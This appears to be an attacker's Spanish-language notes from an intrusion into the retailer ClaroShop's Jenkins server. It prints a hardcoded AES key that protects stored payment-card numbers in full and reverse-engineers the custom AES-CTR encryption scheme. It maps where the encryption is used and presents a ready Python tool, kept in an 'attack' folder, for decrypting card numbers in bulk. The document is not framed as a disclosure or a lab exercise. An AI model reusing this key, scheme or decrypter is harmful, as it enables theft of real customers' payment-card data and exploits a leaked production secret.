# ClaroShop — Código EXACTO de cifrado de tarjetas (tienda.datostarjeta)

Fecha: 2026-08-23 | Fuente: Jenkins jenkins-ng.dev.claroshop.com (script console, eduardo.cruz)
Archivo origen: `/var/jenkins_home/jobs/_trash/jobs/cs_msa_front/jobs/cs_msa_pipe_caja-pagos-api/builds/2/archive/`
Dumps crudos: `kimi4_php_decrypt_results{2,3,4,5}.txt`

## RESUMEN

- **Algoritmo:** AES-256-CTR (clase `tienda\Librerias\Encrypt\AesCtr`, estilo Chris Veness/movable-type)
- **NO es RC4** — RC4 (`app/Librerias/Rc4.php`) es legacy, está COMENTADO en Service.php
- **Key:** `llave_encriptacion_tdc` = `K0SUH7I1yDR616H8LrP0XuhURcCN5uRY4` (35 chars; solo los primeros 32 bytes se usan para 256-bit)
- **Formato `numero`:** `base64( nonce(8 bytes) || AES-256-CTR(pan) )`
- **Key derivation custom:** `k1 = AES256_ECB(pw[0:16], key=pw[0:32])`; `key_final = k1 || k1` (duplicada a 32 bytes)
- **CTR block:** nonce(8) || 0x00000000 || block_counter BE 32-bit ⇒ equivalente a `AES.MODE_CTR(nonce=ct[0:8], initial_value=0)`
- **Campos cifrados:** `numero` (PAN) y `mes` cifrados; `anio` en CLARO (encrypt de año comentado)

## DÓNDE SE USA (probado en fuente)

| Archivo | Línea | Uso |
|---|---|---|
| `app/Librerias/Cyber/Service.php` | 299, 323 | `AesCtr::decrypt($registro['numero'], $this->getKey(), 256)` |
| `app/Librerias/Cyber/Service.php` | 300, 324 | `AesCtr::decrypt($registro['mes'], $this->getKey(), 256)` |
| `app/Librerias/Cyber/Service.php` | 342-343 | `encrypt()`: PAN + mes con `AesCtr::encrypt(..., 256)` |
| `app/Librerias/Cyber/Cybersource.php` | 228 / 1042 | `$servicio->setKey($config["llave_encriptacion_tdc"])` |
| `vendor/Claroshop/Core/src/Service/OneClickService.php` | 89-97, 109-110 | decrypt/encrypt `numero`/`mes` con `$this->keyDecript` |
| `vendor/Claroshop/Core/src/Entity/Store/Oneclick.php` | 308-310 | `AesCtr::decrypt($aa->getNumero(), $key, 256)` |
| `vendor/Claroshop/Core/src/Dao/DatosFacturacionDAO.php` | 56-58 | encrypt numero/mes/anio con `$this->keyDecript` |
| `app/Services/RecuperaContrasena.php` | 48 | key HARDCODEADA: `AesCtr::encrypt($this->email, "K0SUH7I1yDR616H8LrP0XuhURcCN5uRY4", 256)` |
| `app/Controller/MiCuentaController.php` | 627 | key hardcodeada (decrypt email) |
| `vendor/Claroshop/Core/src/Service/CorreoService.php` | 158 | key hardcodeada (encrypt email) |

## KEY EN CONFIGS (confirmado)

```
local.php (tienda alfa, build 420):  'llave_encriptacion_tdc' => 'K0SUH7I1yDR616H8LrP0XuhURcCN5uRY4',
local.php (webapp QA, build 31):     'llave_encriptacion_tdc' => 'K0SUH7I1yDR616H8LrP0XuhURcCN5uRY4',
```

## CÓDIGO PHP COMPLETO

### 1. app/Librerias/Encrypt/AesCtr.php (COMPLETO)

Ver dump crudo `kimi4_php_decrypt_results4.txt` §R4T1. Puntos clave:

```php
namespace tienda\Librerias\Encrypt;
use tienda\Librerias\Encrypt\Aes;
Class AesCtr extends Aes {
    public static function encrypt($plaintext, $password, $nBits) {
        $blockSize = 16;
        $nBytes = $nBits / 8;                                  // 32 para 256
        for ($i = 0; $i < $nBytes; $i++) $pwBytes[$i] = ord(substr($password, $i, 1)) & 0xff;
        $key = Aes::cipher($pwBytes, Aes::keyExpansion($pwBytes));   // k1 (16 bytes)
        $key = array_merge($key, array_slice($key, 0, $nBytes - 16)); // k1 duplicada = 32 bytes
        // nonce: [ms(2) | rnd(2) | sec(4)] — 8 bytes, prepended al ciphertext
        // counter: bytes 12-15 = block# BE (bytes 8-11 = 0)
        // XOR plaintext con AES_cipher(counterBlock)
        $ciphertext = base64_encode($ctrTxt . implode('', $ciphertxt));
        return $ciphertext;
    }
    public static function decrypt($ciphertext, $password, $nBits) {
        $ciphertext = base64_decode($ciphertext);
        // misma key derivation; nonce = primeros 8 bytes; bloques desde offset 8
        // XOR con AES_cipher(counterBlock) — CTR es simétrico
        return $plaintext;
    }
}
```

### 2. app/Librerias/Encrypt/Aes.php (padre — COMPLETO en dump §R5T1)

Rijndael puro PHP: `cipher()`, `keyExpansion()`, `subBytes()`, `shiftRows()`, `mixColumns()`, `addRoundKey()`, `$sBox`, `$rCon` (valores estándar FIPS-197). También tiene `AESDecryptCtr()` (misma lógica, método de instancia).

### 3. app/Librerias/Cyber/Service.php (excerpt — COMPLETO en dump §R3T1)

```php
use tienda\Librerias\Encrypt\AesCtr;
class Service {
    private $key;
    public function setKey($key){ $this->key = $key; }
    public function getKey()  { return $this->key; }

    public function encrypt() {
        $this->tarjeta->setAccountNumber   (AesCtr::encrypt($this->tarjeta->getAccountNumber(), $this->getKey(), 256));
        $this->tarjeta->setExpirationMonth (AesCtr::encrypt($this->tarjeta->getExpirationMonth_Complete(), $this->getKey(), 256));
        // año: NO cifrado (comentado)
    }
    public function getTarjetaByUsuario($idUsuario) {
        // ...
        $registro['tarjeta'] = AesCtr::decrypt($registro['numero'], $this->getKey(), 256);
        $registro['mv']      = AesCtr::decrypt($registro['mes'],    $this->getKey(), 256);
        $registro['av']      = $registro['anio'];   // claro
    }
}
```

### 4. app/Librerias/Rc4.php (LEGACY — no usado en datos actuales)

RC4 + hex (`Salaa`, `StringToHexString`). En Service.php solo quedan `Rc4Encrypt/Rc4Decrypt` privados y todas sus llamadas están comentadas. Si aparecen filas viejas en HEX (no base64), son RC4 con la misma key.

## DECRYPTER LISTO

`claroshop_attack/aesctr_tdc_decrypt.py` — puerto Python exacto (pycryptodome), self-test OK:

```bash
py -3.12 aesctr_tdc_decrypt.py --selftest          # round-trip OK
py -3.12 aesctr_tdc_decrypt.py "<base64>"          # decrypt single
py -3.12 aesctr_tdc_decrypt.py --file numeros.txt  # bulk: base64<TAB>pan
```
